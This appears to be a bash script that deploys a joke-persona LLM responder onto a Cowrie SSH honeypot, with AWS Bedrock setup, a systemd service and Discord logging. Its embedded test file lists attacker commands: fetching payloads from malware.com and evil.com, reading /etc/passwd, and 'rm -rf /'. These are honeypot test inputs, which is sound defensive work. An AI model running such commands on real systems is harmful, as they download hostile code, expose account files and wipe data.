#!/bin/bash
# Deploy AI Honeypot Agent - Comedy Gold Edition
# This script deploys the AI agent to your existing Cowrie honeypot

set -e

echo "🤖 Deploying AI Honeypot Agent - Comedy Gold Edition!"
echo "=================================================="

# Configuration
HONEYPOT_IP="44.218.220.47"
SSH_KEY="~/.ssh/gmu-honeypot-key.pem"
COWRIE_PATH="/opt/cowrie"
DISCORD_MONITOR_PATH="/opt/cowrie/discord-monitor"

echo "📋 Deployment Configuration:"
echo "   Honeypot IP: $HONEYPOT_IP"
echo "   Cowrie Path: $COWRIE_PATH"
echo "   SSH Key: $SSH_KEY"
echo ""

# Step 1: Copy AI agent files to honeypot
echo "📁 Step 1: Copying AI agent files..."
scp -i $SSH_KEY ai_honeypot_agent.py ubuntu@$HONEYPOT_IP:/tmp/
scp -i $SSH_KEY cowrie_ai_integration.py ubuntu@$HONEYPOT_IP:/tmp/

# Step 2: Install dependencies
echo "🔧 Step 2: Installing dependencies..."
ssh -i $SSH_KEY ubuntu@$HONEYPOT_IP << 'EOF'
    # Install AWS SDK
    sudo pip3 install boto3
    
    # Install additional dependencies
    sudo pip3 install twisted
    
    # Create AI agent directory
    sudo mkdir -p /opt/cowrie/ai-agent
    
    # Move files to proper location
    sudo mv /tmp/ai_honeypot_agent.py /opt/cowrie/ai-agent/
    sudo mv /tmp/cowrie_ai_integration.py /opt/cowrie/ai-agent/
    
    # Set permissions
    sudo chown -R cowrie:cowrie /opt/cowrie/ai-agent
    sudo chmod +x /opt/cowrie/ai-agent/*.py
    
    echo "✅ Dependencies installed!"
EOF

# Step 3: Configure AWS credentials for Bedrock
echo "🔑 Step 3: Configuring AWS credentials..."
ssh -i $SSH_KEY ubuntu@$HONEYPOT_IP << 'EOF'
    # Create AWS config directory for cowrie user
    sudo -u cowrie mkdir -p /opt/cowrie/.aws
    
    # Configure AWS credentials (you'll need to add your actual keys)
    sudo -u cowrie tee /opt/cowrie/.aws/credentials > /dev/null << 'AWSEOF'
[default]
aws_access_key_id = YOUR_ACCESS_KEY_HERE
aws_secret_access_key = YOUR_SECRET_KEY_HERE
region = us-east-1
AWSEOF
    
    # Configure AWS config
    sudo -u cowrie tee /opt/cowrie/.aws/config > /dev/null << 'AWSEOF'
[default]
region = us-east-1
output = json
AWSEOF
    
    echo "⚠️  IMPORTANT: Update AWS credentials in /opt/cowrie/.aws/credentials"
    echo "   You need to add your actual AWS access keys for Bedrock access"
EOF

# Step 4: Create AI agent service
echo "🚀 Step 4: Creating AI agent service..."
ssh -i $SSH_KEY ubuntu@$HONEYPOT_IP << 'EOF'
    # Create systemd service for AI agent
    sudo tee /etc/systemd/system/cowrie-ai-agent.service > /dev/null << 'SERVICEEOF'
[Unit]
Description=Cowrie AI Agent - Comedy Gold Edition
After=network.target
Requires=cowrie.service

[Service]
Type=simple
User=cowrie
Group=cowrie
WorkingDirectory=/opt/cowrie/ai-agent
Environment=HOME=/opt/cowrie
Environment=AWS_CONFIG_FILE=/opt/cowrie/.aws/config
Environment=AWS_SHARED_CREDENTIALS_FILE=/opt/cowrie/.aws/credentials
ExecStart=/usr/bin/python3 /opt/cowrie/ai-agent/ai_honeypot_agent.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
SERVICEEOF
    
    # Reload systemd and enable service
    sudo systemctl daemon-reload
    sudo systemctl enable cowrie-ai-agent
    
    echo "✅ AI agent service created!"
EOF

# Step 5: Integrate with existing Cowrie
echo "🔗 Step 5: Integrating with Cowrie..."
ssh -i $SSH_KEY ubuntu@$HONEYPOT_IP << 'EOF'
    # Backup original Cowrie config
    sudo cp /opt/cowrie/etc/cowrie.cfg /opt/cowrie/etc/cowrie.cfg.backup
    
    # Add AI agent configuration to Cowrie
    sudo tee -a /opt/cowrie/etc/cowrie.cfg > /dev/null << 'COWRIEEOF'

# AI Agent Configuration
[ai_agent]
enabled = true
agent_path = /opt/cowrie/ai-agent/ai_honeypot_agent.py
response_delay_min = 2
response_delay_max = 8
comedy_level = maximum
personas = confused_admin,paranoid_karen,helpful_newbie,fake_hacker,tech_support,grandma
COWRIEEOF
    
    echo "✅ Cowrie configuration updated!"
EOF

# Step 6: Create test script
echo "🧪 Step 6: Creating test script..."
ssh -i $SSH_KEY ubuntu@$HONEYPOT_IP << 'EOF'
    # Create test script
    sudo tee /opt/cowrie/ai-agent/test_ai_agent.py > /dev/null << 'TESTEOF'
#!/usr/bin/env python3
"""Test the AI agent with sample commands"""

import sys
sys.path.append('/opt/cowrie/ai-agent')

from ai_honeypot_agent import HoneypotAIAgent

def test_ai_responses():
    agent = HoneypotAIAgent()
    
    test_commands = [
        "wget http://malware.com/payload",
        "chmod +x malware", 
        "whoami",
        "cat /etc/passwd",
        "rm -rf /",
        "python -c 'import socket'",
        "curl http://evil.com/backdoor"
    ]
    
    print("🤖 Testing AI Agent Responses")
    print("=" * 50)
    
    for i, cmd in enumerate(test_commands):
        print(f"\n[TEST {i+1}] Attacker command: {cmd}")
        print("-" * 30)
        
        try:
            response = agent.get_ai_response(cmd, f"test_session_{i}")
            print(f"AI Response: {response}")
        except Exception as e:
            print(f"Error: {e}")
            print("Fallback response:", agent._get_fallback_response('confused_admin'))
        
        print("-" * 30)

if __name__ == "__main__":
    test_ai_responses()
TESTEOF
    
    sudo chmod +x /opt/cowrie/ai-agent/test_ai_agent.py
    sudo chown cowrie:cowrie /opt/cowrie/ai-agent/test_ai_agent.py
    
    echo "✅ Test script created!"
EOF

# Step 7: Update Discord monitoring to include AI responses
echo "💬 Step 7: Updating Discord monitoring..."
ssh -i $SSH_KEY ubuntu@$HONEYPOT_IP << 'EOF'
    # Add AI response logging to Discord monitor
    if [ -f "/opt/cowrie/discord-monitor/Enhanced_Honeypot_Monitor_Script.py" ]; then
        # Backup original
        sudo cp /opt/cowrie/discord-monitor/Enhanced_Honeypot_Monitor_Script.py \
               /opt/cowrie/discord-monitor/Enhanced_Honeypot_Monitor_Script.py.backup
        
        # Add AI integration (this would need manual integration)
        echo "⚠️  Manual step required: Integrate AI responses with Discord monitoring"
        echo "   Edit: /opt/cowrie/discord-monitor/Enhanced_Honeypot_Monitor_Script.py"
        echo "   Add: from ai_honeypot_agent import process_attacker_command"
    fi
EOF

echo ""
echo "🎉 AI Agent Deployment Complete!"
echo "================================="
echo ""
echo "📋 Next Steps:"
echo "1. 🔑 Update AWS credentials in /opt/cowrie/.aws/credentials"
echo "2. 🧪 Test the AI agent: ssh to honeypot and run:"
echo "   sudo -u cowrie python3 /opt/cowrie/ai-agent/test_ai_agent.py"
echo "3. 🚀 Start the AI service:"
echo "   sudo systemctl start cowrie-ai-agent"
echo "4. 📊 Check logs:"
echo "   sudo journalctl -u cowrie-ai-agent -f"
echo "5. 🎭 Watch the comedy unfold in your Discord alerts!"
echo ""
echo "💰 Cost Estimate:"
echo "   - Claude Haiku: ~$0.25 per 1M tokens"
echo "   - Average response: ~100 tokens = $0.000025"
echo "   - Daily budget $1 = ~40,000 AI responses"
echo ""
echo "🎪 Comedy Personas Available:"
echo "   - Dave (Confused Admin): Thinks attackers are IT support"
echo "   - Karen (Paranoid User): Everything is a conspiracy"
echo "   - Tyler (Eager Intern): Wants to learn hacking"
echo "   - xX_DarkLord_Xx (Fake Hacker): Starts arguments"
echo "   - Rajesh (Tech Support): Insists they called support"
echo "   - Ethel (Lost Grandma): Thinks this is Facebook"
echo ""
echo "🎯 Ready to troll some hackers! 😈"